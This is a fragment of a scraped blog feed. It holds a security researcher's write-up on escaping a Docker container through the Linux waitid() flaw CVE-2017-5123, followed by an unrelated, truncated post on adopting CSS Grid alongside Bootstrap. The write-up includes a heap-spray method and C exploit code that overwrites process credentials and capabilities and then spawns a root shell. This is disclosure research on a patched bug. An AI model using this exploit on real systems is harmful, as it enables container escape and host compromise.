&lt;p&gt;But before we dive in, since an image is worth a thousand words, here is my exploit in action. It modifies the containerized process capabilities structure in memory, resulting in a gain of &lt;code&gt;CAP_SYS_ADMIN&lt;/code&gt; and &lt;code&gt;CAP_NET_ADMIN&lt;/code&gt; capabilities. This results in the ability to enable promiscuous mode on &lt;code&gt;eth0&lt;/code&gt; ( docker bridge for the container):&lt;/p&gt;

&lt;p&gt;&lt;iframe width=&quot;960&quot; height=&quot;540&quot; src=&quot;https://www.youtube.com/embed/IdRDFS4u2rQ?feature=oembed&quot; frameborder=&quot;0&quot; gesture=&quot;media&quot; allow=&quot;encrypted-media&quot; allowfullscreen=&quot;&quot;&gt;[embedded content]&lt;/iframe&gt;&lt;/p&gt;
&lt;p&gt;Note that I have turned off &lt;code&gt;Kernel ASLR&lt;/code&gt; for the recording, but it also works with &lt;code&gt;KASLR&lt;/code&gt; as we can find the kernel base and the heap base by using the same vulnerability.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://access.redhat.com/security/cve/cve-2017-5123&quot;&gt;CVE-2017-5123&lt;/a&gt; was published earlier this year on Oct 12 — it was a Linux kernel vulnerability in the &lt;a href=&quot;http://uw714doc.sco.com/en/man/html.2/waitid.2.html&quot;&gt;&lt;strong&gt;waitid()&lt;/strong&gt;&lt;/a&gt; syscall for 4.12-4.13 kernel versions. The &lt;code&gt;waitid()&lt;/code&gt; syscall defined as :&lt;/p&gt;
&lt;pre&gt;
int waitid(idtype_t idtype, id_t id, siginfo_t *infop, int options);
&lt;/pre&gt;
&lt;p&gt;The vulnerability allows an attacker to write a partially-controlled data to kernel memory address of his choice. The kernel memory address can be provided as the &lt;code&gt;infop&lt;/code&gt; pointer above. The pointer points to a &lt;code&gt;struct siginfo&lt;/code&gt; described below. In this struct we can control several variables, specifically &lt;code&gt;pid&lt;/code&gt; and &lt;code&gt;status&lt;/code&gt;&lt;em&gt;.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;As you can see below, the control is rather indirect.&lt;br/&gt;&lt;/p&gt;
&lt;pre&gt;
struct siginfo {
    int si_signo;
    int si_errno;
    int si_code;
    int padding;   // this remains unchanged by waitid
    int pid;       // process id
    int uid;       // user id
    int status;    // return code
}
&lt;/pre&gt;
&lt;br/&gt;Most of the values cannot be controlled by us or are limited in their size for our needs, however we can control the &lt;code&gt;pid&lt;/code&gt; value by creating a lot of processes with the help of &lt;code&gt;fork()&lt;/code&gt; or &lt;code&gt;clone()&lt;/code&gt; until we hit the desired &lt;code&gt;pid&lt;/code&gt; value. Still, we are limited by the &lt;code&gt;PID_MAX&lt;/code&gt; value of the system, which is by default configured to be &lt;code&gt;32768&lt;/code&gt; which equals to &lt;code&gt;0x8000&lt;/code&gt; in hex.
&lt;p&gt;Note: In a non-containerized environment we could elevate this number after changing our &lt;code&gt;uid&lt;/code&gt; to 0 and gain root privileges, as we could modify &lt;code&gt;/proc/sys/kernel/pid_max&lt;/code&gt; to any number.&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;alignnone size-full wp-image-5852&quot; src=&quot;https://www.twistlock.com/wp-content/uploads/2017/12/pid_max.png&quot; alt=&quot;&quot; width=&quot;730&quot; height=&quot;54&quot; srcset=&quot;https://www.twistlock.com/wp-content/uploads/2017/12/pid_max.png 730w, https://www.twistlock.com/wp-content/uploads/2017/12/pid_max-300x22.png 300w&quot; sizes=&quot;(max-width: 730px) 100vw, 730px&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Linux Capabilities&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;In this section I’ll focus on a short overview of Linux capabilities – what they are, how Docker uses them, and how they are represented in the memory.&lt;/p&gt;
&lt;p&gt;The code snippet below is taken from &lt;a href=&quot;https://github.com/torvalds/linux/blob/master/include/linux/cred.h&quot;&gt;&lt;em&gt;linux/cred.h&lt;/em&gt;&lt;/a&gt; and is the definition of the credentials struct that each process has:&lt;br/&gt;&lt;/p&gt;
&lt;pre&gt;
struct cred {
    atomic_t    usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
    atomic_t    subscribers;    /* number of processes subscribed */
    void        *put_addr;
    unsigned    magic;
#define CRED_MAGIC    0x43736564
#define CRED_MAGIC_DEAD    0x44656144
#endif
    kuid_t        uid;        /* real UID of the task */
    kgid_t        gid;        /* real GID of the task */
    kuid_t        suid;        /* saved UID of the task */
    kgid_t        sgid;        /* saved GID of the task */
    kuid_t        euid;        /* effective UID of the task */
    kgid_t        egid;        /* effective GID of the task */
    kuid_t        fsuid;        /* UID for VFS ops */
    Kgid_t    fsgid; /* GID for VFS ops */
    Unsigned    securebits; /* SUID-less security management */
    Kernel_cap_t    cap_inheritable; /* caps our children can inherit */
    Kernel_cap_t    cap_permitted;    /* caps we're permitted */
    Kernel_cap_t    cap_effective;    /* caps we can actually use */
    Kernel_cap_t    cap_bset; /* capability bounding set */
    kernel_cap_t    cap_ambient; /* Ambient capability set */

&lt;/pre&gt;
&lt;br/&gt;&lt;strong&gt;man capabilities:&lt;/strong&gt;
&lt;blockquote readability=&quot;10&quot;&gt;
&lt;p&gt;Starting with kernel 2.2, Linux divides the privileges traditionally associated with superuser into distinct units, known as &lt;em&gt;capabilities&lt;/em&gt;, which can be independently enabled and disabled.&lt;br/&gt;Capabilities are a per-thread attribute.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Linux capabilities are stored inside each process’s own &lt;code&gt;cred struct&lt;/code&gt; and represented by a bitmask. For example all caps enabled would be represented by a bitmask of &lt;code&gt;0xFFFFFFFFFFFFFFFF&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Each capability provides a different set of permissions, for instance:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;CAP_SYS_MODULE&lt;/code&gt;  – allows for loading &amp;amp; unloading kernel modules.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;CAP_NET_ADMIN&lt;/code&gt; – allows for various network operations. For example entering promiscuous mode, interface configuration and more.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;CAP_SYS_ADMIN&lt;/code&gt; – enables a range of system administration operations such as quotactl, mount, umount, swapon, setdomainname, ptrace and much more (this cap gives the most privileges and overloads others).&lt;/p&gt;
&lt;p&gt;You can find the full list of CAPS &lt;a href=&quot;http://man7.org/linux/man-pages/man7/capabilities.7.html&quot;&gt;over here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Docker uses capabilities to provide a better isolation for containers. It simply drops capabilities that would enable container escape. For example, you will rarely see a container that is running out-of-the-box with any of the 3 capabilities above, as it would be a security concern if a container could access the network interface and sniff the traffic of other containers or the host itself, or if a user inside the container could mount directories on the host and load kernel modules.&lt;/p&gt;
&lt;p&gt;Although it might be easier to build a &lt;a href=&quot;https://en.wikipedia.org/wiki/Return-oriented_programming&quot;&gt;ROP chain&lt;/a&gt; and call &lt;code&gt;commit_creds(0)&lt;/code&gt; in order to gain root with full capabilities, in order to learn more about heap spraying, I decided to go with the blind exploitation method by spraying the kernel heap with thousands of &lt;code&gt;struct creds&lt;/code&gt; like Federico did. The downside of the this exploit is that full caps are impossible to reach as we are not in control of what we are writing (we are limited to 0x8000) and the value of &lt;code&gt;0xFFFFFFFFFFFFFFFF&lt;/code&gt; is out of reach for us.&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;The vulnerability&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;The code snippet below is taken from &lt;a href=&quot;https://github.com/torvalds/linux/blob/master/kernel/exit.c#L1596&quot;&gt;&lt;em&gt;kernel/exit.c&lt;/em&gt;&lt;/a&gt; and is in charge of handling the &lt;code&gt;waitid()&lt;/code&gt; syscall:&lt;br/&gt;&lt;/p&gt;
&lt;pre&gt;
SYSCALL_DEFINE5(waitid, int, which, pid_t, upid, struct siginfo __user *,
        infop, int, options, struct rusage __user *, ru)
{
    struct rusage r;
    struct waitid_info info = {.status = 0};
    long err = kernel_waitid(which, upid, &amp;amp;amp;info, options, ru ? &amp;amp;amp;r : NULL);
    int signo = 0;

    if (err &amp;amp;gt; 0) {
        signo = SIGCHLD;
        err = 0;
        if (ru &amp;amp;amp;&amp;amp;amp; copy_to_user(ru, &amp;amp;amp;r, sizeof(struct rusage)))
            return -EFAULT;
    }
    if (!infop)
        return err;

    if (!access_ok(VERIFY_WRITE, infop, sizeof(*infop)))
        return -EFAULT;

    user_access_begin();
    unsafe_put_user(signo, &amp;amp;amp;infop-&amp;amp;gt;si_signo, Efault);
    unsafe_put_user(0, &amp;amp;amp;infop-&amp;amp;gt;si_errno, Efault);
    unsafe_put_user(info.cause, &amp;amp;amp;infop-&amp;amp;gt;si_code, Efault);
    unsafe_put_user(info.pid, &amp;amp;amp;infop-&amp;amp;gt;si_pid, Efault);
    unsafe_put_user(info.uid, &amp;amp;amp;infop-&amp;amp;gt;si_uid, Efault);
    unsafe_put_user(info.status, &amp;amp;amp;infop-&amp;amp;gt;si_status, Efault);
    user_access_end();
    return err;
Efault:
    user_access_end();
    return -EFAULT;
}

&lt;/pre&gt;
&lt;br/&gt;The vulnerability is that the highlighted &lt;code&gt;access_ok()&lt;/code&gt; check, which ensures that the user specified pointer is in fact a user-space pointer, was missing in the &lt;code&gt;waitid()&lt;/code&gt; syscall. Without this check a user can supply a kernel address pointer and the syscall will write to it without objections when executing &lt;code&gt;unsafe_put_user&lt;/code&gt;.&lt;br/&gt;As we already know – we can’t simply write whatever we want, but we will have to try to gain as much as we can within these limitations.
&lt;p&gt;&lt;code&gt;Info.status&lt;/code&gt; is a 32 bit int, but the value of status is constrained to &lt;code&gt;0 &amp;amp;lt; status &amp;amp;gt; 256&lt;/code&gt; as we can see in the &lt;a href=&quot;http://tldp.org/LDP/abs/html/exitcodes.html&quot;&gt;exit codes documentation&lt;/a&gt;, and as we already know &lt;code&gt;pid&lt;/code&gt; is constrained by &lt;code&gt;MAX_PID&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;At this point we have the ability to write a value of &lt;code&gt;pid&lt;/code&gt; :  &lt;code&gt;0&lt;/code&gt; &amp;lt; &lt;code&gt;pid&lt;/code&gt; &amp;lt; &lt;code&gt;0x8000&lt;/code&gt; to anywhere we want. The next challenge is to detect where we should write in order to successfully overwrite the desired values.&lt;/p&gt;
&lt;p&gt;We need to remember that the syscall will actually write 6 different fields each time we execute it, as there will be 6 executions of &lt;code&gt;unsafe_put_user()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;So we will need to take into account the offset of &lt;code&gt;pid&lt;/code&gt; inside the &lt;code&gt;infop struct&lt;/code&gt; and use it to subtract that value from the target address that we want to write to, the target address is then passed into &lt;code&gt;waitid()&lt;/code&gt; syscall as the &lt;code&gt;infop&lt;/code&gt; pointer.&lt;/p&gt;
&lt;p&gt;Our main goal with this exploit is to overwrite the capabilities that Docker sets for us, thus gaining additional privileges and to escape the container.&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Spray n’ Pray&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;I decided to take an approach similar to Federico, so I proceeded to spray the kernel heap with thousands of &lt;code&gt;struct creds&lt;/code&gt; and then start guessing by writing to various addresses and pray to hit my target.&lt;/p&gt;
&lt;p&gt;By picking a value that we can track such as &lt;code&gt;uid&lt;/code&gt; (which we can track with &lt;code&gt;getuid()&lt;/code&gt;).&lt;br/&gt;We can, with a little bit a luck, pinpoint our &lt;code&gt;struct cred&lt;/code&gt; location, after which we will be able to write to specific offsets in order to overwrite the &lt;code&gt;capabilities&lt;/code&gt;, &lt;code&gt;gid&lt;/code&gt;, &lt;code&gt;euid&lt;/code&gt; and anything else we want.&lt;br/&gt;But in order to do that we need to figure out the actual offsets, which we will do with the help of &lt;code&gt;gdb&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;alignnone size-full wp-image-5851&quot; src=&quot;https://www.twistlock.com/wp-content/uploads/2017/12/gdb.png&quot; alt=&quot;&quot; width=&quot;733&quot; height=&quot;170&quot; srcset=&quot;https://www.twistlock.com/wp-content/uploads/2017/12/gdb.png 733w, https://www.twistlock.com/wp-content/uploads/2017/12/gdb-300x70.png 300w&quot; sizes=&quot;(max-width: 733px) 100vw, 733px&quot;/&gt;&lt;/p&gt;
&lt;p&gt;As we can see, &lt;code&gt;kuid_t&lt;/code&gt; is 4 bytes in size, as such if we found uid on &lt;code&gt;0xFFFF880023cc1004&lt;/code&gt; than &lt;code&gt;gid&lt;/code&gt; will be at &lt;code&gt;0xFFFF880023cc1008&lt;/code&gt;, 4 bytes above, and &lt;code&gt;euid&lt;/code&gt; will be at &lt;code&gt;0xFFFF880023CC1014&lt;/code&gt; which is 4*0x4=0x10 bytes above our &lt;code&gt;uid&lt;/code&gt; address as illustrated in the diagram below.&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;alignnone size-full wp-image-5854&quot; src=&quot;https://www.twistlock.com/wp-content/uploads/2017/12/diagram.png&quot; alt=&quot;&quot; width=&quot;414&quot; height=&quot;440&quot; srcset=&quot;https://www.twistlock.com/wp-content/uploads/2017/12/diagram.png 414w, https://www.twistlock.com/wp-content/uploads/2017/12/diagram-282x300.png 282w&quot; sizes=&quot;(max-width: 414px) 100vw, 414px&quot;/&gt;&lt;/p&gt;
&lt;p&gt;So essentially in order to overwrite our caps we will have to write to:&lt;br/&gt;&lt;code&gt;address_of_uid+0x4*8 = address_of_uid+0x20 = address_of_cap_inheritable&lt;/code&gt;&lt;br/&gt;Note: These addresses are relevant to my system, your addresses might differ.&lt;/p&gt;
&lt;p&gt;In order to find out where our sprayed &lt;code&gt;cred structs&lt;/code&gt; might land in the heap we will use &lt;code&gt;gdb&lt;/code&gt; again and set a breakpoint on &lt;code&gt;sys_getuid&lt;/code&gt; in order to break when our program calls &lt;code&gt;getuid()&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;A few step commands after the breakpoint (it took 5 on my system) should reveal the &lt;code&gt;cred struct&lt;/code&gt; address in the &lt;code&gt;RAX&lt;/code&gt; register.&lt;/p&gt;
&lt;p&gt;We can repeat that process of finding the struct for a number of forks in order to collect enough addresses and analyze the statistics of where the &lt;code&gt;struct cred&lt;/code&gt; is most likely to be in the heap&lt;/p&gt;
&lt;p&gt;So the plan is as follows:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Spawn thousands of processes by calling &lt;code&gt;fork()&lt;/code&gt; in order to create thousands of &lt;code&gt;cred structs&lt;/code&gt; in the kernel heap and make each of the processes constantly check if its UID==0 by calling &lt;code&gt;getuid()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Start writing the value 0 to addresses to which the &lt;code&gt;struct cred-&amp;amp;gt;uid&lt;/code&gt; might land&lt;/li&gt;
&lt;li&gt;If and when one of our forked processes gets uid==0, it means that we have successfully overwritten the &lt;code&gt;uid&lt;/code&gt; value with our guesses from step 2. Now we can overwrite the rest of the &lt;code&gt;cred struct&lt;/code&gt; and change caps by writing to the offsets that we determined.&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;Our dirty exploit will be something to the effect of:&lt;br/&gt;&lt;/p&gt;
&lt;pre&gt;
void writecaps(char *addr,unsigned long value){
while(1) {
      int pid = clone(exit_func, &amp;amp;amp;new_stack[5000], CLONE_VM | SIGCHLD, NULL);
      if (!pid) {
        exit(0);
      }
      if (pid == value) {
        syscall(SYS_waitid, P_PID, pid, addr, WEXITED, NULL);
        break;
      }
}

void spraynpray(){
pid_t pid;
FILE *f;
char *argv[] = {&quot;/bin/sh&quot;, NULL};
for (int i=0;i&amp;amp;lt;5000;i++)
{
    pid = fork();
    if (pid==0)
    { // child process
  while (1) {
    
    if (*glob_var==1) {
      syscall(SYS_exit, 0);
    }
    if (getuid() == 0){
        //FOUND!!
    printf(&quot;[+] Got UID: 0 !\n&quot;);
     *glob_var = 1;
     writecaps((char *)finalcapsaddress,value);
    printf(&quot;Done, spawning a shell \n&quot;);
    execve(&quot;/bin/sh&quot;, argv, NULL);
    }
}
    }

    else if(pid&amp;amp;lt;0)
    {
        printf(&quot;failed to fork&quot;);
    }

    else //parent process
    {

    }
}
}

void swapuid(){

    char* i,p;
    while(*glob_var!=1)
    {
    for(i = (char *)0xffff8800321b4004; ; i+=0xc0)
        {
        if(*glob_var==1)
            {
            break;
            }
        printf(&quot;trying %p\n&quot;,i);
        syscall(__NR_waitid, P_PID, 0,(siginfo_t *)i, WEXITED, NULL);
        sleep(1);
        }
    }
munmap(glob_var, sizeof *glob_var);
printf(&quot;Found uid on %p\n&quot;,i-0xc0);
sleep(10000);
}

int main(void)
{
    glob_var = mmap(NULL, sizeof *glob_var, PROT_READ | PROT_WRITE,
                    MAP_SHARED | MAP_ANONYMOUS, -1, 0);

    *glob_var = 0;

unsigned long* base = findbase();
    findheapbase();
    spraynpray();
    swapuid();
}

&lt;/pre&gt;
&lt;br/&gt;After analyzing my system (Ubuntu 17.10,Kernel 4.13.0-15, arch x86-64), I found a couple of areas where it seemed that cred struct is more likely to land in about 70% of the executions, but there is still a risk of crashing the machine because we may overwrite something important in the kernel.
&lt;h2&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;In 2017 alone, &lt;a href=&quot;https://www.cvedetails.com/product/47/Linux-Linux-Kernel.html?vendor_id=33&quot;&gt;434 linux kernel exploits where found&lt;/a&gt;, and as you have seen in this post, kernel exploits can be devastating for containerized environments. This is because containers share the same kernel as the host, thus trusting the built-in protection mechanisms alone isn’t sufficient. Make sure your kernel is always updated on all of your production hosts.&lt;/p&gt;
&lt;p&gt;Thank you for reading and don’t forget to follow us &lt;a href=&quot;https://twitter.com/TwistlockLabs&quot;&gt;@TwistlockLabs&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Big credits to &lt;a href=&quot;https://reverse.put.as/2017/11/07/exploiting-cve-2017-5123/&quot;&gt;Federico Bento&lt;/a&gt; for pointing some things out and to &lt;a href=&quot;https://salls.github.io/Linux-Kernel-CVE-2017-5123/&quot;&gt;Chris Salls&lt;/a&gt; for his Chrome sandbox escape exploit; my exploitation is heavily based on their work.&lt;/p&gt;
&lt;div class=&quot;btm-post-author&quot; readability=&quot;33.289473684211&quot;&gt;

&lt;div class=&quot;post-author-wrap&quot; readability=&quot;37.631578947368&quot;&gt;
&lt;h5 class=&quot;post-author-name&quot;&gt;&lt;a href=&quot;https://www.twistlock.com/author/daniel-shapira/&quot; title=&quot;Posts by Daniel Shapira&quot; class=&quot;author url fn&quot; rel=&quot;author&quot;&gt;Daniel Shapira&lt;/a&gt; | Security Researcher&lt;/h5&gt;
&lt;p&gt;Daniel is a Twistlock security researcher who embarked on this path as a black-hat hacker at the age of 13, and later on changed hats in order to move to security consulting, penetration testing and lastly security research. Daniel has previously worked at HP Software, WhiteHat Consulting, Nyotron and on numerous freelance security projects in the US &amp;amp; Israel.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot;post-pag&quot;&gt;&lt;a href=&quot;https://www.twistlock.com/blog&quot;&gt;← Back to All Posts&lt;/a&gt; &lt;a href=&quot;https://www.twistlock.com/2017/12/19/introduction-serverless-security-part-1/&quot;&gt;Next Post →&lt;/a&gt;&lt;/div&gt;
</description>
<pubDate>Fri, 29 Dec 2017 16:06:10 +0000</pubDate>
<dc:creator>Da5hes</dc:creator>
<og:type>article</og:type>
<og:title>Escaping Docker container using waitid() - CVE-2017-5123 | Twistlock</og:title>
<og:description>Escaping Docker container using waitid() - CVE-2017-5123 from Twistlock. Dev-to-Production Docker and container security for enterprises.</og:description>
<og:url>https://www.twistlock.com/2017/12/27/escaping-docker-container-using-waitid-cve-2017-5123/</og:url>
<og:image>https://www.twistlock.com/wp-content/uploads/2017/12/diagram.png</og:image>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.twistlock.com/2017/12/27/escaping-docker-container-using-waitid-cve-2017-5123/</dc:identifier>
</item>
<item>
<title>From Bootstrap to CSS Grid</title>
<link>https://open.nytimes.com/bootstrap-to-css-grid-87b3f5f830e4?pagewanted=all</link>
<guid isPermaLink="true" >https://open.nytimes.com/bootstrap-to-css-grid-87b3f5f830e4?pagewanted=all</guid>
<description>&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;0*pkfyT6WJt5lNNKkH.&quot; data-width=&quot;610&quot; data-height=&quot;198&quot; src=&quot;https://cdn-images-1.medium.com/max/1600/0*pkfyT6WJt5lNNKkH.&quot;/&gt;&lt;/div&gt;
&lt;p name=&quot;fd36&quot; id=&quot;fd36&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;Despite many clever hacks and creative workarounds, there hasn’t been a simple answer for creating layout on the web. From misusing tables, to over-engineering simple floats that push around content, developers have consistently struggled to translate designs to code. Developers have been saying for years that there has to be a better way to create responsive websites, and finally, there is: CSS Grid, a proper layout tool for the web baked right into CSS itself, is here. It’s fantastic! It’s exactly what we’ve been waiting for! And yet, it seems to me that developers are hesitating. What’s the hold up?&lt;/p&gt;
&lt;h4 name=&quot;8d16&quot; id=&quot;8d16&quot; class=&quot;graf graf--h4 graf--startsWithDoubleQuote graf-after--p&quot;&gt;&lt;strong class=&quot;markup--strong markup--h4-strong&quot;&gt;“There’s no way I can start using CSS Grid yet”&lt;/strong&gt;&lt;/h4&gt;
&lt;p name=&quot;ef59&quot; id=&quot;ef59&quot; class=&quot;graf graf--p graf-after--h4&quot;&gt;You’re absolutely ready to declare display: grid if you’re the only person contributing code. However, if you’re working with a bigger team, on an older project or are faced with some real-world constraints, there may be some challenges ahead of you:&lt;/p&gt;
&lt;ul class=&quot;postList&quot;&gt;&lt;li name=&quot;99cb&quot; id=&quot;99cb&quot; class=&quot;graf graf--li graf-after--p&quot;&gt;Your designers have heard, “No, you can’t do that, that’s not how layout on the web works,” too many times, so they’re not designing anything that calls for you to learn CSS Grid.&lt;/li&gt;
&lt;li name=&quot;0b6c&quot; id=&quot;0b6c&quot; class=&quot;graf graf--li graf-after--li&quot;&gt;Your developers have heard, “You can’t use that yet, we still have to support x browser,” too many times. They don’t dare dream that all of the excitement about CSS Grid can apply to them quite yet — adding CSS Grid is out of scope.&lt;/li&gt;
&lt;li name=&quot;27a8&quot; id=&quot;27a8&quot; class=&quot;graf graf--li graf-after--li&quot;&gt;You’re on a tight deadline and you’re still not over how long it took you to really wrap your head around Flexbox. You promise yourself that you’ll take the time learn CSS Grid next time… for the next project… someday.&lt;/li&gt;
&lt;/ul&gt;&lt;p name=&quot;29a9&quot; id=&quot;29a9&quot; class=&quot;graf graf--p graf-after--li&quot;&gt;If any of the scenarios above sound familiar, then start small with Progressive Enhancement. Use &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/CSS/@supports&quot; data-href=&quot;https://developer.mozilla.org/en-US/docs/Web/CSS/@supports&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;feature queries&lt;/a&gt; to enhance your components with CSS Grid, and worry about deleting old code later. Use the time to show the potential of CSS Grid to your designers. Learn without worrying. You might have to override some styles, but the gains will outweigh the temporary extra code.&lt;/p&gt;
&lt;h3 name=&quot;81b6&quot; id=&quot;81b6&quot; class=&quot;graf graf--h3 graf-after--p&quot;&gt;&lt;strong class=&quot;markup--strong markup--h3-strong&quot;&gt;Gridlock&lt;/strong&gt;&lt;/h3&gt;
&lt;h4 name=&quot;a321&quot; id=&quot;a321&quot; class=&quot;graf graf--h4 graf--startsWithDoubleQuote graf-after--h3&quot;&gt;&lt;strong class=&quot;markup--strong markup--h4-strong&quot;&gt;“That sounds nice, but I can’t use CSS Grid, we’re still on Bootstrap!”&lt;/strong&gt;&lt;/h4&gt;
&lt;p name=&quot;d0f3&quot; id=&quot;d0f3&quot; class=&quot;graf graf--p graf-after--h4&quot;&gt;Don’t let that stop you from progressively enhancing your app with the new and exciting features of CSS!&lt;/p&gt;
&lt;p name=&quot;16b4&quot; id=&quot;16b4&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;CSS is a powerful tool and remarkably flexible. I made an &lt;a href=&quot;https://codepen.io/tallys/pen/bRrLYV&quot; data-href=&quot;https://codepen.io/tallys/pen/bRrLYV&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;example on Codepen&lt;/a&gt; that embraces CSS Grid without removing the Bootstrap code or functionality for old browsers. Try it out, resize your browser, and then toggle off the CSS Grid enhancement. I tried to make just about every breakpoint a little different to show the creativity and flexibility made possible with CSS Grid. Fork it, play around and make something new. It’s just an example, and I hope you have fun with it.&lt;/p&gt;

Codepen Example
&lt;h4 name=&quot;7e6b&quot; id=&quot;7e6b&quot; class=&quot;graf graf--h4 graf--startsWithDoubleQuote graf-after--figure&quot;&gt;&lt;strong class=&quot;markup--strong markup--h4-strong&quot;&gt;“Why didn’t you just use Bootstrap? There’s hardly any difference!”&lt;/strong&gt;&lt;/h4&gt;
&lt;p name=&quot;dd84&quot; id=&quot;dd84&quot; class=&quot;graf graf--p graf-after--h4&quot;&gt;Yeah, yeah. Listen, I get that I could have just used Bootstrap and called it a day; it works just fine, and it’s incredibly fast to throw together once it’s already on a project. That’s why it’s still the fallback.&lt;/p&gt;
&lt;p name=&quot;d8af&quot; id=&quot;d8af&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;But once you get a glimpse of the future, it’s hard to stay in the past. I have seen the power and potential of CSS Grid and I wanted to start using it. Or, more specifically:&lt;/p&gt;
&lt;ul class=&quot;postList&quot;&gt;&lt;li name=&quot;f8e6&quot; id=&quot;f8e6&quot; class=&quot;graf graf--li graf-after--p&quot;&gt;I didn’t want to declare a height to accommodate the maximum content. I would much rather have the rows know how tall each item should be.&lt;/li&gt;
&lt;li name=&quot;21e1&quot; id=&quot;21e1&quot; class=&quot;graf graf--li graf-after--li&quot;&gt;I wanted the option of having variable widths for each item, and I didn’t want to have them be split evenly or predictably all of the time.&lt;/li&gt;
&lt;li name=&quot;e22f&quot; id=&quot;e22f&quot; class=&quot;graf graf--li graf-after--li&quot;&gt;I was bored by having to always think in terms of 12 columns. Lots of websites use 12 columns and they all look the same.&lt;/li&gt;
&lt;li name=&quot;e796&quot; id=&quot;e796&quot; class=&quot;graf graf--li graf-after--li&quot;&gt;I felt trapped by fixed breakpoints for columns, and I wanted to set my own breakpoints to best serve my content.&lt;/li&gt;
&lt;li name=&quot;6e6c&quot; id=&quot;6e6c&quot; class=&quot;graf graf--li graf-after--li&quot;&gt;I didn’t want to keep making the choice between affecting global layout rules and writing hacky overrides.&lt;/li&gt;
&lt;li name=&quot;5c64&quot; id=&quot;5c64&quot; class=&quot;graf graf--li graf-after--li&quot;&gt;I wanted to easily change the gap between my columns. Sometimes a 3px column gap is all you need.&lt;/li&gt;
&lt;li name=&quot;44fa&quot; id=&quot;44fa&quot; class=&quot;graf graf--li graf-after--li&quot;&gt;I wanted to be able to set a min and max for each item and let the browser figure out how many items fit in each row. I am a huge fan of letting the browser do the math.&lt;/li&gt;
&lt;li name=&quot;53c5&quot; id=&quot;53c5&quot; class=&quot;graf graf--li graf-after--li&quot;&gt;It took about three lines of CSS to write the grid layout I wanted, and I wanted to live in the bright and beautiful future where layout is always that simple.&lt;/li&gt;
&lt;/ul&gt;&lt;p name=&quot;9550&quot; id=&quot;9550&quot; class=&quot;graf graf--p graf-after--li&quot;&gt;Most importantly, I wanted to be excited about layout on the web again, and I wanted the designers I work with to feel the same.&lt;/p&gt;
&lt;h4 name=&quot;4c90&quot; id=&quot;4c90&quot; class=&quot;graf graf--h4 graf--startsWithDoubleQuote graf-after--p&quot;&gt;&lt;strong class=&quot;markup--strong markup--h4-strong&quot;&gt;“Won’t I just be writing throwaway code?”&lt;/strong&gt;&lt;/h4&gt;
&lt;p name=&quot;bb9d&quot; id=&quot;bb9d&quot; class=&quot;graf graf--p graf-after--h4&quot;&gt;CSS Grid isn’t a hack, it’s a proper layout tool for the web. You don’t need to install anything, you don’t need a preprocessor, and you don’t need to twist your brain into knots just to understand how it works.&lt;/p&gt;
&lt;p name=&quot;f65f&quot; id=&quot;f65f&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;Using CSS Grid doesn’t mean writing throwaway code — the throwaway code will be the old code you’ll want to delete when the timing is right, and that will be much sooner than you think: Chrome, Firefox and Safari all support CSS Grid, and soon Edge 16 will support CSS Grid, too.&lt;/p&gt;
&lt;h4 name=&quot;c21b&quot; id=&quot;c21b&quot; class=&quot;graf graf--h4 graf--startsWithDoubleQuote graf-after--p&quot;&gt;“That’s nice in theory, but what about in practice?”&lt;/h4&gt;
&lt;p name=&quot;cc84&quot; id=&quot;cc84&quot; class=&quot;graf graf--p graf-after--h4&quot;&gt;Turns out, it’s pretty great in practice, too. I implemented this CSS Grid progressive enhancement on &lt;a href=&quot;https://www.nytimes.com/watching&quot; data-href=&quot;https://www.nytimes.com/watching&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;The New York Times Watching&lt;/a&gt; media card component. Users on old browsers see Bootstrap, but users on browsers that support the display: grid property get the CSS Grid enhanced styles including the thin column gutters that our designers envisioned. Plus, next time there’s a redesign, our designers know they aren’t beholden to the old way of doing layout on the web. It may not look like it right now, but it’s actually a major step forward.&lt;/p&gt;
&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

